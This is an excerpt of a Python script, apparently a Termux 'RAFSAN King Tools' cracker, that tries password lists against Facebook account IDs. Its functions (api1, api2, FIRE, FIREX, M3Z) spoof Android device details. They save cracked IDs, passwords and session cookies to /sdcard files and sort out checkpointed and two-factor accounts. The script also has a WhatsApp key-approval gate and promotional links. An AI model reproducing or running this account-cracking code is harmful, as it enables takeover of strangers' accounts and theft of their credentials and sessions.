...
logo = (f"""
  ...
  {G}⋆{GGG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}⋆
\x1b[1;92m {XX}[\x1b[1;92m💎{XX}]\x1b[38;5;46m AUTHOR   : Rafsan-Ahmed             
\x1b[1;92m {XX}[\x1b[1;92m💎{XX}] \x1b[38;5;47mFACEBOOK : Rafsan Asif            
\x1b[1;92m {XX}[\x1b[1;92m💎{XX}] \x1b[38;5;48mGITHUB   : Rafsan-402            
\x1b[1;92m {XX}[\x1b[1;92m💎{XX}] \x1b[38;5;48mVERSION  : 0.1✨	
⋆{GGG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}⋆""")
def linex():
        print(f'{G}⋆{GGG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}⋆')
def clear():
...
def menu():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Key%20The%20Key%20Is%20:%20'+id);os.system('am start https://wa.me/+8801876308902?text='+tks),approval()
      time.sleep(9)
      approval()
  except:
    sys.exit()
...
def menu_a():
			clear()
			os.system('espeak -a 300 " Welcome,   to,  RAFSAN,  King,  Tools"')
			linex()
			...
			if xd in ['1','01']:
				clear()
				print(f'\x1b[1;92m {XX}[\x1b[1;92m💎{XX}]\x1b[38;5;46m FILE NAME : /sdcard/RAFSAN.txt  etc..')
				linex()
				...
				RANDOM()
			elif xd in ['3','03']:os.system('xdg-open https://www.facebook.com/profile.php?id=100059861204385');menu()
			elif xd in ['4','04']:os.system('xdg-open https://chat.whatsapp.com/KZArqWm3KS68A0qm5l5kJc/');menu()
			elif xd in ['5','05']:os.system('xdg-open https://chat.whatsapp.com/KZArqWm3KS68A0qm5l5kJc/');menu()
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write(f'\r {bRAFSAN}[{G}RAFSAN-M2{bRAFSAN}]-[{G}%s{bRAFSAN}]-[{G}OK:%s{bRAFSAN}]'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print(f'\r\r {bRAFSAN}[{G}RAFSAN-OK{bRAFSAN}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                                        open('/sdcard/RAFSAN-FILE-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;36m[RAFSAN-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;30m[RAFSAN-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/RAFSAN-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/RAFSAN-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api1(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write(f'\r {bRAFSAN}[{G}RAFSAN-M1{bRAFSAN}]-[{G}%s{bRAFSAN}]-[{G}OK:%s{bRAFSAN}]'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def FIRE(ids,pwv,tl):
    ...
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mRAFSAN-M1\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            ...
            if 'access_token' in po:
                ...
                print(f'\r\r {bRAFSAN}[{G}RAFSAN-OK{bRAFSAN}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                print(f'\r\r {bRAFSAN}[{G}•{bRAFSAN}]{G} '+kuki+'')
                linex()
                open('/sdcard/RAFSAN-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
...
def FIREX(ids,pwv,tl):
    global loop,oks,cps,twf
    cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mRAFSAN-M2\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
            ...
            if 'access_token' in po:
                ...
                print(f'\r\r {bRAFSAN}[{G}•{bRAFSAN}]{G} '+kuki+'')
                linex()
                open('/sdcard/RAFSAN-M2-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
...
def M3Z(ids,pwv,tl):
    global loop,oks,cps,twf
    cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mRAFSAN-M3\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
            ...
            if 'access_token' in po:
                ...
                print(f'\r\r {bRAFSAN}[{G}•{bRAFSAN}]{G} '+kuki+'')
                linex()
                open('/sdcard/RAFSAN-M3-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
